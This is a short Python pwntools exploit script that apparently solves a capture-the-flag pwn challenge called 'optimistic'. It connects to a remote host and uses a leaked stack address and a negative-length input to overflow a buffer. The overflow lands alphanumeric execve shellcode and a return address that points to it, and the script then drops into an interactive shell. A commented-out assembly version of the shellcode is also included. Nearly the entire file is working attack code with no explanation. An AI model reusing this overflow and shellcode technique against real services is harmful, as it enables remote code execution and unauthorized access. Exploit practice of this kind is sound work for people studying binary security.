#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./optimistic',checksec=False)

#p = process()
p = remote('94.237.59.119',56229)
#gdb.attach(p,gdbscript='''
#           brva 0x00000000000013CC
#           brva 0x000000000000140b
#           ''')

input()
#shellcode = asm('''
#                xor rsi,rsi
#                xor rdx,rdx
#                mov r9,29400045130965551
#                push r9
#                mov rdi,rsp
#                mov rax,0x3b
#                syscall

#                ''')
shellcode_real = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
payload = shellcode_real.ljust(0x68,b'a')
p.sendlineafter(b' (y/n): ',b'y')
p.recvuntil(b'gift: ')
leak = int(p.recvline(),16)
log.info(f"leak {hex(leak)}")
target = leak - 0x60
p.sendafter(b'Email: ',b'ploi')
p.sendafter(b'Age: ',b'hehe')
p.sendlineafter(b'name: ',b'-1')
p.sendlineafter(b'Name: ',payload + p64(target))


p.interactive()
